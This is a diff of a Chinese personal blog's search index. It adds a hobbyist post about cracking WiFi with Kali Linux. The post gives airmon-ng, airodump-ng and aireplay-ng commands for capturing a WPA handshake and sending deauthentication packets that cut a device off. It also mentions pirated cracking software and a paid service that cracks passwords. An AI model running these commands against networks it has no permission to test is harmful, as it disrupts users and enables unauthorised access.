@@ -1,19 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>开头的话</title>
-    <url>/2020/10/04/%E5%BC%80%E5%A4%B4%E7%9A%84%E8%AF%9D/</url>
-    <content><![CDATA[<p>理论上这不是写在这个博客的第一篇文章，事实上这确实是写在这个博客里的第一篇文章。</p>
-<p>end.</p>
-]]></content>
-      <categories>
-        <category>杂谈</category>
-      </categories>
-      <tags>
-        <tag>无题</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Gus Fring</title>
     <url>/2020/10/05/Gus-Fring/</url>
     <content><![CDATA[<p>​    一个独特的视角</p>
@@ -24,6 +11,68 @@
       </categories>
       <tags>
         <tag>人物</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Kali Linux 无线渗透初体验</title>
+    <url>/2020/10/09/Kali-Linux-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
+    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><blockquote>
+<p>下午5点多收到的USB无线网卡，随即开始进行WiFi密码爆破工作。</p>
+<p>期间经历了虚拟机的崩溃，连接网卡后主机蓝屏等。。</p>
+<p>最终于八时许将所有的准备工作准备妥当。</p>
+</blockquote>
+<a id="more"></a>
+
+<p>​    <strong>提醒：私自破解他人WiFi属于违法行为，知道了破解方法，相信大家就懂得如何防范了。</strong></p>
+<p><strong>相关资料如下：</strong></p>
+<blockquote>
+<ul>
+<li><p>网卡：芯片RT3070L，双5db天线；</p>
+</li>
+<li><p>主机：windows10 2004</p>
+</li>
+<li><p>虚拟机：VMware-workstation-full-15.1.0-13591040</p>
+</li>
+<li><p>系统：kali-linux-2020.3-live-amd64.iso</p>
+</li>
+<li><p>跑包软件：EWSA 7.01.456.0 pro  破解版</p>
+</li>
+<li><p>显卡：笔记本 GTX1060 6GB</p>
+</li>
+</ul>
+</blockquote>
+<p><strong>相关命令：</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用airmon-ng命令检查网卡是否支持监听模式</span></span><br><span class="line">airmon-ng</span><br><span class="line"><span class="comment"># 开启无线网卡的监听模式</span></span><br><span class="line">airmon-ng start wlan0</span><br><span class="line"><span class="comment"># 扫描环境中的WiFi网络</span></span><br><span class="line">airodump-ng wlan0mon</span><br><span class="line"><span class="comment"># 抓取握手包 （另起一个 终端窗口）</span></span><br><span class="line">airodump-ng -c 信道号(CH) --bssid mac地址(BSSID) -w hach wlan0mon</span><br><span class="line"><span class="comment"># 开始对选中的wifi进行攻击，被攻击设备会断网（另起一个终端窗口）</span></span><br><span class="line">aireplay-ng -0 10 -a 路由器地址 -c 被攻击设备地址 wlan0mon</span><br></pre></td></tr></table></figure>
+
+<p>​    爬过了千山万水，跑包才是重点！</p>
+<p>​    跑了十几分钟就放弃了，之前联系的一个代跑包的，一次跑出20RMB</p>
+<blockquote>
+<p>参考教程：<a href="https://www.mzbky.com/327.html">使用Kali Linux 暴力破解wifi密码详细步骤</a></p>
+<p>ps ： 本博客尚未找到合适的图床，图片暂时不放了。</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>密码</tag>
+        <tag>DIY</tag>
+        <tag>计算机</tag>
+        <tag>网络</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>开头的话</title>
+    <url>/2020/10/04/%E5%BC%80%E5%A4%B4%E7%9A%84%E8%AF%9D/</url>
+    <content><![CDATA[<p>理论上这不是写在这个博客的第一篇文章，事实上这确实是写在这个博客里的第一篇文章。</p>
+<p>end.</p>
+]]></content>
+      <categories>
+        <category>杂谈</category>
+      </categories>
+      <tags>
+        <tag>无题</tag>
       </tags>
   </entry>
   <entry>
